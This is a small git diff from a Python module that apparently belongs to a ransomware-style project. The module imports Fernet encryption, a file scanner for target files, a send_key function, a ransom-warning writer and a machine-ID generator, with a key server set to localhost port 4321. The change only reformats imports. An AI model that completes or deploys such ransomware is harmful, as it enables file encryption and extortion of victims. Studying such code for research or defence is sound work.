@@ -10,10 +10,12 @@
 # See the LICENSE file in the project root for full license text.
 
 from pathlib import Path
+
 from cryptography.fernet import Fernet
+
 from encrypter import parse_files
 from file_scanner import IGNORE_DIRS, TARGET_FILES, get_all_files
-from utils import gen_machine_id, send_key, save_warning_text
+from utils import gen_machine_id, save_warning_text, send_key
 
 SERVER_HOST = "localhost"
 PORT = 4321
